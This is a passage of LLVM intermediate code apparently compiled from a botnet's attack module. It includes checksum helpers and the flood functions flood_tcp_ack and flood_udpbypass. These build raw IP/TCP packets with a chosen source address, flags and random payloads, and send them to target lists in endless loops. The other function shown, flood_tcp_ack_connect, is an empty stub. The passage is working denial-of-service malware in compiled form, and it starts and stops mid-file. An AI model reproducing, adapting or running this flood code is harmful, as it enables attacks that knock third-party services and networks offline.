  %40 = lshr i64 %.1, 16
  %41 = and i64 %.1, 65535
  %42 = add nuw nsw i64 %40, %41
  %43 = lshr i64 %42, 16
  %44 = add nuw nsw i64 %43, %42
  %45 = trunc i64 %44 to i16
  %46 = xor i16 %45, -1
  ret i16 %46
}

; Function Attrs: noinline nounwind readonly uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr* nocapture readonly, i8* nocapture readonly, i16 zeroext, i32) local_unnamed_addr #1 {
  %5 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  %8 = load i32, i32* %7, align 4
  %9 = icmp sgt i32 %3, 1
  br i1 %9, label %.lr.ph33.preheader, label %._crit_edge34

.lr.ph33.preheader:                               ; preds = %4
  %10 = bitcast i8* %1 to i16*
  %11 = add i32 %3, -2
  %12 = lshr i32 %11, 1
  %13 = shl nuw i32 %12, 1
  %14 = zext i32 %13 to i64
  %15 = add nuw nsw i64 %14, 2
  %scevgep = getelementptr i8, i8* %1, i64 %15
  %16 = shl nuw i32 %12, 1
  %17 = add i32 %3, -2
  %18 = lshr i32 %17, 1
  %19 = add nuw i32 %18, 1
  %xtraiter = and i32 %19, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph33.prol.loopexit, label %.lr.ph33.prol.preheader

.lr.ph33.prol.preheader:                          ; preds = %.lr.ph33.preheader
  br label %.lr.ph33.prol

.lr.ph33.prol:                                    ; preds = %.lr.ph33.prol, %.lr.ph33.prol.preheader
  %.031.prol = phi i32 [ %24, %.lr.ph33.prol ], [ %3, %.lr.ph33.prol.preheader ]
  %.02630.prol = phi i32 [ %22, %.lr.ph33.prol ], [ 0, %.lr.ph33.prol.preheader ]
  %.02729.prol = phi i16* [ %23, %.lr.ph33.prol ], [ %10, %.lr.ph33.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph33.prol ], [ %xtraiter, %.lr.ph33.prol.preheader ]
  %20 = load i16, i16* %.02729.prol, align 2
  %21 = zext i16 %20 to i32
  %22 = add i32 %21, %.02630.prol
  %23 = getelementptr inbounds i16, i16* %.02729.prol, i64 1
  %24 = add nsw i32 %.031.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph33.prol.loopexit.unr-lcssa, label %.lr.ph33.prol, !llvm.loop !3

.lr.ph33.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph33.prol
  br label %.lr.ph33.prol.loopexit

.lr.ph33.prol.loopexit:                           ; preds = %.lr.ph33.preheader, %.lr.ph33.prol.loopexit.unr-lcssa
  %.031.unr = phi i32 [ %3, %.lr.ph33.preheader ], [ %24, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02630.unr = phi i32 [ 0, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.02729.unr = phi i16* [ %10, %.lr.ph33.preheader ], [ %23, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %.lcssa44.unr = phi i32 [ undef, %.lr.ph33.preheader ], [ %22, %.lr.ph33.prol.loopexit.unr-lcssa ]
  %25 = icmp ult i32 %17, 6
  br i1 %25, label %._crit_edge34.loopexit, label %.lr.ph33.preheader.new

.lr.ph33.preheader.new:                           ; preds = %.lr.ph33.prol.loopexit
  br label %.lr.ph33

.lr.ph33:                                         ; preds = %.lr.ph33, %.lr.ph33.preheader.new
  %.031 = phi i32 [ %.031.unr, %.lr.ph33.preheader.new ], [ %42, %.lr.ph33 ]
  %.02630 = phi i32 [ %.02630.unr, %.lr.ph33.preheader.new ], [ %40, %.lr.ph33 ]
  %.02729 = phi i16* [ %.02729.unr, %.lr.ph33.preheader.new ], [ %41, %.lr.ph33 ]
  %26 = load i16, i16* %.02729, align 2
  %27 = zext i16 %26 to i32
  %28 = add i32 %27, %.02630
  %29 = getelementptr inbounds i16, i16* %.02729, i64 1
  %30 = load i16, i16* %29, align 2
  %31 = zext i16 %30 to i32
  %32 = add i32 %31, %28
  %33 = getelementptr inbounds i16, i16* %.02729, i64 2
  %34 = load i16, i16* %33, align 2
  %35 = zext i16 %34 to i32
  %36 = add i32 %35, %32
  %37 = getelementptr inbounds i16, i16* %.02729, i64 3
  %38 = load i16, i16* %37, align 2
  %39 = zext i16 %38 to i32
  %40 = add i32 %39, %36
  %41 = getelementptr inbounds i16, i16* %.02729, i64 4
  %42 = add nsw i32 %.031, -8
  %43 = icmp sgt i32 %42, 1
  br i1 %43, label %.lr.ph33, label %._crit_edge34.loopexit.unr-lcssa

._crit_edge34.loopexit.unr-lcssa:                 ; preds = %.lr.ph33
  br label %._crit_edge34.loopexit

._crit_edge34.loopexit:                           ; preds = %.lr.ph33.prol.loopexit, %._crit_edge34.loopexit.unr-lcssa
  %.lcssa44 = phi i32 [ %.lcssa44.unr, %.lr.ph33.prol.loopexit ], [ %40, %._crit_edge34.loopexit.unr-lcssa ]
  %44 = add i32 %3, -2
  %45 = sub i32 %44, %16
  br label %._crit_edge34

._crit_edge34:                                    ; preds = %._crit_edge34.loopexit, %4
  %46 = phi i8* [ %1, %4 ], [ %scevgep, %._crit_edge34.loopexit ]
  %.026.lcssa = phi i32 [ 0, %4 ], [ %.lcssa44, %._crit_edge34.loopexit ]
  %.0.lcssa = phi i32 [ %3, %4 ], [ %45, %._crit_edge34.loopexit ]
  %47 = icmp eq i32 %.0.lcssa, 1
  br i1 %47, label %48, label %52

; <label>:48:                                     ; preds = %._crit_edge34
  %49 = load i8, i8* %46, align 1
  %50 = zext i8 %49 to i32
  %51 = add i32 %50, %.026.lcssa
  br label %52

; <label>:52:                                     ; preds = %48, %._crit_edge34
  %.1 = phi i32 [ %51, %48 ], [ %.026.lcssa, %._crit_edge34 ]
  %53 = lshr i32 %6, 16
  %54 = and i32 %6, 65535
  %55 = lshr i32 %8, 16
  %56 = and i32 %8, 65535
  %57 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  %58 = load i8, i8* %57, align 1
  %59 = zext i8 %58 to i16
  %60 = tail call zeroext i16 @htons(i16 zeroext %59) #14
  %61 = zext i16 %60 to i32
  %62 = zext i16 %2 to i32
  %63 = add nuw nsw i32 %53, %62
  %64 = add nuw nsw i32 %63, %54
  %65 = add nuw nsw i32 %64, %55
  %66 = add nuw nsw i32 %65, %56
  %67 = add i32 %66, %.1
  %68 = add i32 %67, %61
  %69 = lshr i32 %68, 16
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %52
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %71 = phi i32 [ %74, %.lr.ph ], [ %69, %.lr.ph.preheader ]
  %.228 = phi i32 [ %73, %.lr.ph ], [ %68, %.lr.ph.preheader ]
  %72 = and i32 %.228, 65535
  %73 = add nuw nsw i32 %72, %71
  %74 = lshr i32 %73, 16
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %52
  %.2.lcssa = phi i32 [ %68, %52 ], [ %73, %._crit_edge.loopexit ]
  %76 = trunc i32 %.2.lcssa to i16
  %77 = xor i16 %76, -1
  ret i16 %77
}

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #4

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) local_unnamed_addr #9

; Function Attrs: noinline noreturn nounwind uwtable
define void @flood_tcp_ack(%struct.arguments* nocapture readonly) #8 {
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %2, align 4
  %4 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 1
  %5 = load %struct.option*, %struct.option** %4, align 8
  %6 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 2
  %7 = load i8, i8* %6, align 8
  %8 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 2, i16 zeroext 900)
  %9 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 1, i16 zeroext -1)
  %10 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 7, i16 zeroext 255)
  %11 = trunc i16 %10 to i8
  %12 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 8, i16 zeroext -1)
  %13 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 9, i16 zeroext 1)
  %14 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 10, i16 zeroext 0)
  %15 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 11, i16 zeroext 0)
  %16 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 12, i16 zeroext 0)
  %17 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 13, i16 zeroext 0)
  %18 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 14, i16 zeroext 0)
  %19 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 15, i16 zeroext 0)
  %20 = trunc i16 %19 to i8
  %21 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 16, i16 zeroext -1)
  %22 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %5, i8 zeroext %7, i8 zeroext 17, i16 zeroext -1)
  %23 = load i32, i32* @LOCAL_ADDRESS, align 4
  %24 = tail call i32 @retrieve_opt_ipv4(%struct.option* %5, i8 zeroext %7, i8 zeroext 18, i32 %23)
  %25 = load %struct.option*, %struct.option** %4, align 8
  %26 = load i8, i8* %6, align 8
  %27 = tail call zeroext i16 @retrieve_opt_num(%struct.option* %25, i8 zeroext %26, i8 zeroext 19, i16 zeroext -1)
  %28 = tail call i8* @retrieve_opt_str(%struct.option* %25, i8 zeroext %26, i8 zeroext 22, i8* inttoptr (i64 1 to i8*))
  %29 = ptrtoint i8* %28 to i64
  %30 = trunc i64 %29 to i32
  %31 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 3
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i64
  %34 = tail call noalias i8* @calloc(i64 %33, i64 8) #13
  %35 = bitcast i8* %34 to i8**
  %36 = icmp eq i8* %34, null
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %1
  tail call void @exit(i32 1) #15
  unreachable

; <label>:38:                                     ; preds = %1
  %39 = load i8, i8* %31, align 1
  %40 = zext i8 %39 to i64
  %41 = tail call noalias i8* @calloc(i64 %40, i64 4) #13
  %42 = bitcast i8* %41 to i32*
  %43 = icmp eq i8* %41, null
  br i1 %43, label %71, label %.preheader152

.preheader152:                                    ; preds = %38
  %44 = load i8, i8* %31, align 1
  %45 = icmp eq i8 %44, 0
  br i1 %45, label %.preheader, label %.lr.ph155

.lr.ph155:                                        ; preds = %.preheader152
  %46 = bitcast i32* %2 to i8*
  %47 = icmp eq i32 %30, 0
  %48 = zext i16 %8 to i32
  %49 = add nuw nsw i32 %48, 110
  %50 = zext i32 %49 to i64
  %51 = add i16 %8, 40
  %52 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %53 = shl i16 %13, 12
  %54 = and i16 %53, 4096
  %55 = shl i16 %14, 8
  %56 = and i16 %55, 256
  %57 = shl i16 %15, 13
  %58 = and i16 %57, 8192
  %59 = shl i16 %16, 11
  %60 = and i16 %59, 2048
  %61 = shl i16 %17, 10
  %62 = and i16 %61, 1024
  %63 = shl i16 %18, 9
  %64 = and i16 %63, 512
  %65 = or i16 %54, %56
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %70 = zext i16 %12 to i32
  br label %82

; <label>:71:                                     ; preds = %38
  tail call void @exit(i32 1) #15
  unreachable

.preheader.loopexit:                              ; preds = %104
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader152
  %72 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %73 = zext i16 %8 to i64
  %74 = add nuw nsw i64 %73, 20
  %75 = trunc i64 %74 to i16
  %76 = trunc i64 %74 to i32
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  %79 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %80 = add nuw nsw i64 %73, 40
  %81 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %.pr = load i8, i8* %31, align 1
  br label %.loopexit

; <label>:82:                                     ; preds = %.lr.ph155, %104
  %indvars.iv156 = phi i64 [ 0, %.lr.ph155 ], [ %indvars.iv.next157, %104 ]
  %83 = call i32 @socket(i32 2, i32 3, i32 6) #13
  %84 = getelementptr inbounds i32, i32* %42, i64 %indvars.iv156
  store i32 %83, i32* %84, align 4
  %85 = icmp eq i32 %83, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %82
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:87:                                     ; preds = %82
  store i32 1, i32* %2, align 4
  %88 = load i32, i32* %84, align 4
  %89 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* nonnull %46, i32 4) #13
  %90 = icmp eq i32 %89, -1
  br i1 %90, label %91, label %92

; <label>:91:                                     ; preds = %87
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:92:                                     ; preds = %87
  br i1 %47, label %99, label %93

; <label>:93:                                     ; preds = %92
  %94 = load i32, i32* %84, align 4
  %95 = load %struct.target*, %struct.target** %69, align 8
  %96 = getelementptr inbounds %struct.target, %struct.target* %95, i64 %indvars.iv156, i32 0
  %97 = load i32, i32* %96, align 4
  %98 = call i32 @tcp_handshake(i16 zeroext %9, i32 %94, i32 %97, i32 %24, i32 %70)
  br label %99

; <label>:99:                                     ; preds = %92, %93
  %100 = call noalias i8* @malloc(i64 %50) #13
  %101 = getelementptr inbounds i8*, i8** %35, i64 %indvars.iv156
  store i8* %100, i8** %101, align 8
  %102 = icmp eq i8* %100, null
  br i1 %102, label %103, label %104

; <label>:103:                                    ; preds = %99
  call void @free(i8* nonnull %34) #13
  call void @exit(i32 1) #15
  unreachable

; <label>:104:                                    ; preds = %99
  %105 = getelementptr inbounds i8, i8* %100, i64 20
  %106 = getelementptr inbounds i8, i8* %100, i64 40
  %107 = load i8, i8* %100, align 4
  %108 = and i8 %107, 15
  %109 = or i8 %108, 64
  store i8 %109, i8* %100, align 4
  %110 = getelementptr inbounds i8, i8* %100, i64 1
  store i8 %20, i8* %110, align 1
  %111 = call zeroext i16 @htons(i16 zeroext %51) #14
  %112 = getelementptr inbounds i8, i8* %100, i64 2
  %113 = bitcast i8* %112 to i16*
  store i16 %111, i16* %113, align 2
  %114 = load i8, i8* %100, align 4
  %115 = and i8 %114, -16
  %116 = or i8 %115, 5
  store i8 %116, i8* %100, align 4
  %117 = getelementptr inbounds i8, i8* %100, i64 6
  %118 = bitcast i8* %117 to i16*
  store i16 0, i16* %118, align 2
  %119 = getelementptr inbounds i8, i8* %100, i64 8
  store i8 %11, i8* %119, align 4
  %120 = call zeroext i16 @htons(i16 zeroext %21) #14
  %121 = getelementptr inbounds i8, i8* %100, i64 4
  %122 = bitcast i8* %121 to i16*
  store i16 %120, i16* %122, align 4
  %123 = getelementptr inbounds i8, i8* %100, i64 9
  store i8 6, i8* %123, align 1
  %124 = getelementptr inbounds i8, i8* %100, i64 12
  %125 = bitcast i8* %124 to i32*
  store i32 %24, i32* %125, align 4
  %126 = load %struct.target*, %struct.target** %52, align 8
  %127 = getelementptr inbounds %struct.target, %struct.target* %126, i64 %indvars.iv156, i32 0
  %128 = load i32, i32* %127, align 4
  %129 = getelementptr inbounds i8, i8* %100, i64 16
  %130 = bitcast i8* %129 to i32*
  store i32 %128, i32* %130, align 4
  %131 = call zeroext i16 @htons(i16 zeroext %9) #14
  %132 = getelementptr inbounds i8, i8* %100, i64 22
  %133 = bitcast i8* %132 to i16*
  store i16 %131, i16* %133, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %12) #14
  %135 = bitcast i8* %105 to i16*
  store i16 %134, i16* %135, align 4
  %136 = call zeroext i16 @htons(i16 zeroext %22) #14
  %137 = zext i16 %136 to i32
  %138 = getelementptr inbounds i8, i8* %100, i64 24
  %139 = bitcast i8* %138 to i32*
  store i32 %137, i32* %139, align 4
  %140 = getelementptr inbounds i8, i8* %100, i64 32
  %141 = bitcast i8* %140 to i16*
  %142 = load i16, i16* %141, align 4
  %143 = and i16 %142, -16369
  %144 = or i16 %68, %143
  %145 = or i16 %144, 80
  store i16 %145, i16* %141, align 4
  %146 = getelementptr inbounds i8, i8* %100, i64 34
  %147 = bitcast i8* %146 to i16*
  store i16 0, i16* %147, align 2
  %148 = call zeroext i16 @htons(i16 zeroext %27) #14
  %149 = zext i16 %148 to i32
  %150 = getelementptr inbounds i8, i8* %100, i64 28
  %151 = bitcast i8* %150 to i32*
  store i32 %149, i32* %151, align 4
  call void @rand_string(i8* %106, i32 %48)
  %indvars.iv.next157 = add nuw i64 %indvars.iv156, 1
  %152 = load i8, i8* %31, align 1
  %153 = zext i8 %152 to i64
  %154 = icmp slt i64 %indvars.iv.next157, %153
  br i1 %154, label %82, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %202
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  %155 = phi i8 [ %.pr, %.preheader ], [ %.be, %.loopexit.backedge ]
  %156 = icmp eq i8 %155, 0
  br i1 %156, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  %.be = phi i8 [ 0, %.loopexit ], [ %218, %.loopexit.loopexit ]
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %202
  %indvars.iv = phi i64 [ %indvars.iv.next, %202 ], [ 0, %.lr.ph.preheader ]
  %157 = getelementptr inbounds i8*, i8** %35, i64 %indvars.iv
  %158 = bitcast i8** %157 to %struct.iphdr**
  %159 = load %struct.iphdr*, %struct.iphdr** %158, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1
  %161 = load %struct.target*, %struct.target** %72, align 8
  %162 = getelementptr inbounds %struct.target, %struct.target* %161, i64 %indvars.iv, i32 1
  %163 = load i16, i16* %162, align 4
  %164 = icmp ult i16 %163, 32
  br i1 %164, label %165, label %170

; <label>:165:                                    ; preds = %.lr.ph
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 0, i32 9
  %167 = load i32, i32* %166, align 4
  %168 = call i32 @ntohl(i32 %167) #14
  %169 = call i32 @htonl(i32 %168) #14
  store i32 %169, i32* %166, align 4
  br label %170

; <label>:170:                                    ; preds = %165, %.lr.ph
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 0, i32 8
  %172 = load i32, i32* %171, align 4
  %173 = icmp eq i32 %172, -1
  br i1 %173, label %174, label %175

; <label>:174:                                    ; preds = %170
  store i32 0, i32* %171, align 4
  br label %175

; <label>:175:                                    ; preds = %174, %170
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 0, i32 3
  %177 = load i16, i16* %176, align 4
  %178 = icmp eq i16 %177, -1
  br i1 %178, label %179, label %180

; <label>:179:                                    ; preds = %175
  store i16 0, i16* %176, align 4
  br label %180

; <label>:180:                                    ; preds = %179, %175
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1, i32 2
  %182 = load i16, i16* %181, align 2
  %183 = icmp eq i16 %182, -1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %180
  store i16 0, i16* %181, align 2
  br label %185

; <label>:185:                                    ; preds = %184, %180
  %186 = bitcast %struct.iphdr* %160 to i16*
  %187 = load i16, i16* %186, align 4
  %188 = icmp eq i16 %187, -1
  br i1 %188, label %189, label %190

; <label>:189:                                    ; preds = %185
  store i16 0, i16* %186, align 4
  br label %190

; <label>:190:                                    ; preds = %189, %185
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1, i32 3
  %192 = bitcast i16* %191 to i32*
  %193 = load i32, i32* %192, align 4
  %194 = icmp eq i32 %193, 65535
  br i1 %194, label %195, label %196

; <label>:195:                                    ; preds = %190
  store i32 0, i32* %192, align 4
  br label %196

; <label>:196:                                    ; preds = %195, %190
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1, i32 5
  %198 = bitcast i8* %197 to i32*
  %199 = load i32, i32* %198, align 4
  %200 = icmp eq i32 %199, 65535
  br i1 %200, label %201, label %202

; <label>:201:                                    ; preds = %196
  store i32 0, i32* %198, align 4
  br label %202

; <label>:202:                                    ; preds = %201, %196
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 0, i32 7
  store i16 0, i16* %203, align 2
  %204 = bitcast %struct.iphdr* %159 to i16*
  %205 = call zeroext i16 @ip_header_checksum(i16* %204, i32 20) #13
  store i16 %205, i16* %203, align 2
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 1, i32 9
  %207 = bitcast i32* %206 to i16*
  store i16 0, i16* %207, align 4
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i64 0, i32 0
  %209 = call zeroext i16 @htons(i16 zeroext %75) #14
  %210 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* nonnull %159, i8* %208, i16 zeroext %209, i32 %76) #13
  store i16 %210, i16* %207, align 4
  store i16 2, i16* %77, align 4
  %211 = load i16, i16* %181, align 2
  store i16 %211, i16* %78, align 2
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i64 0, i32 9
  %213 = load i32, i32* %212, align 4
  store i32 %213, i32* %79, align 4
  %214 = getelementptr inbounds i32, i32* %42, i64 %indvars.iv
  %215 = load i32, i32* %214, align 4
  %216 = load i8*, i8** %157, align 8
  %217 = call i64 @sendto(i32 %215, i8* %216, i64 %80, i32 16384, %struct.sockaddr* nonnull %81, i32 16) #13
  %indvars.iv.next = add nuw i64 %indvars.iv, 1
  %218 = load i8, i8* %31, align 1
  %219 = zext i8 %218 to i64
  %220 = icmp slt i64 %indvars.iv.next, %219
  br i1 %220, label %.lr.ph, label %.loopexit.loopexit
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define void @flood_tcp_ack_connect(%struct.arguments* nocapture) #11 {
  ret void
}

; Function Attrs: noinline noreturn nounwind uwtable
define void @flood_udpbypass(%struct.arguments* nocapture readonly) #8 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 3
  %5 = load i8, i8* %4, align 1
  %6 = zext i8 %5 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 4) #13
  %8 = bitcast i8* %7 to i32*
  %9 = icmp eq i8* %7, null
  br i1 %9, label %23, label %.preheader36

.preheader36:                                     ; preds = %1
  %10 = load i8, i8* %4, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %.preheader.preheader, label %.lr.ph42

.lr.ph42:                                         ; preds = %.preheader36
  %12 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 1
  %13 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 2
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %17 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  %20 = getelementptr inbounds %struct.arguments, %struct.arguments* %0, i64 0, i32 0
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %22 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  br label %24

; <label>:23:                                     ; preds = %1
  tail call void @exit(i32 1) #15
  unreachable

; <label>:24:                                     ; preds = %.lr.ph42, %49
  %indvars.iv45 = phi i64 [ 0, %.lr.ph42 ], [ %indvars.iv.next46, %49 ]
  %25 = load %struct.option*, %struct.option** %12, align 8
  %26 = load i8, i8* %13, align 8
  %27 = call i32 @rand() #13
  %28 = srem i32 %27, 65482
  %29 = add nsw i32 %28, 53
  %30 = trunc i32 %29 to i16
  %31 = call zeroext i16 @retrieve_opt_num(%struct.option* %25, i8 zeroext %26, i8 zeroext 1, i16 zeroext %30)
  %32 = call i32 @socket(i32 2, i32 2, i32 0) #13
  %33 = getelementptr inbounds i32, i32* %8, i64 %indvars.iv45
  store i32 %32, i32* %33, align 4
  %34 = icmp eq i32 %32, -1
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %24
  call void @exit(i32 1) #15
  unreachable

; <label>:36:                                     ; preds = %24
  store i16 2, i16* %14, align 4
  store i16 0, i16* %15, align 2
  store i32 0, i32* %16, align 4
  %37 = load i32, i32* %33, align 4
  %38 = call i32 @bind(i32 %37, %struct.sockaddr* nonnull %17, i32 16) #13
  store i16 2, i16* %18, align 4
  %39 = call zeroext i16 @htons(i16 zeroext %31) #14
  store i16 %39, i16* %19, align 2
  %40 = load %struct.target*, %struct.target** %20, align 8
  %41 = getelementptr inbounds %struct.target, %struct.target* %40, i64 %indvars.iv45, i32 1
  %42 = load i16, i16* %41, align 4
  %43 = icmp ult i16 %42, 32
  %44 = getelementptr inbounds %struct.target, %struct.target* %40, i64 %indvars.iv45, i32 0
  %45 = load i32, i32* %44, align 4
  br i1 %43, label %46, label %49

; <label>:46:                                     ; preds = %36
  %47 = call i32 @ntohl(i32 %45) #14
  %48 = call i32 @htonl(i32 %47) #14
  br label %49

; <label>:49:                                     ; preds = %36, %46
  %50 = phi i32 [ %48, %46 ], [ %45, %36 ]
  store i32 %50, i32* %21, align 4
  %51 = load i32, i32* %33, align 4
  %52 = call i32 @connect(i32 %51, %struct.sockaddr* nonnull %22, i32 16) #13
  %indvars.iv.next46 = add nuw i64 %indvars.iv45, 1
  %53 = load i8, i8* %4, align 1
  %54 = zext i8 %53 to i64
  %55 = icmp slt i64 %indvars.iv.next46, %54
  br i1 %55, label %24, label %.preheader.preheader.loopexit

.preheader.preheader.loopexit:                    ; preds = %49
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %.preheader.preheader.loopexit, %.preheader36
  %.ph = phi i8 [ 0, %.preheader36 ], [ %53, %.preheader.preheader.loopexit ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader.backedge
  %56 = phi i8 [ %.pr, %.preheader.backedge ], [ %.ph, %.preheader.preheader ]
  %57 = icmp eq i8 %56, 0
  br i1 %57, label %.preheader.backedge, label %.lr.ph40.preheader

.lr.ph40.preheader:                               ; preds = %.preheader
  br label %.lr.ph40

.preheader.backedge.loopexit:                     ; preds = %._crit_edge
  br label %.preheader.backedge

.preheader.backedge:                              ; preds = %.preheader.backedge.loopexit, %.preheader
  %.pr = load i8, i8* %4, align 1
  br label %.preheader

.lr.ph40:                                         ; preds = %.lr.ph40.preheader, %._crit_edge
  %indvars.iv43 = phi i64 [ %indvars.iv.next44, %._crit_edge ], [ 0, %.lr.ph40.preheader ]
  %58 = call i32 @rand() #13
  %59 = srem i32 %58, 436
  %60 = add nsw i32 %59, 1024
  %.mask = and i32 %60, 65535
  %61 = zext i32 %.mask to i64
  %62 = call noalias i8* @malloc(i64 %61) #13
  %63 = icmp eq i32 %.mask, 0
  br i1 %63, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.lr.ph40
  %wide.trip.count = zext i32 %.mask to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %64 = call i32 @rand() #13
  %65 = trunc i32 %64 to i8
  %66 = getelementptr inbounds i8, i8* %62, i64 %indvars.iv
  store i8 %65, i8* %66, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.lr.ph40
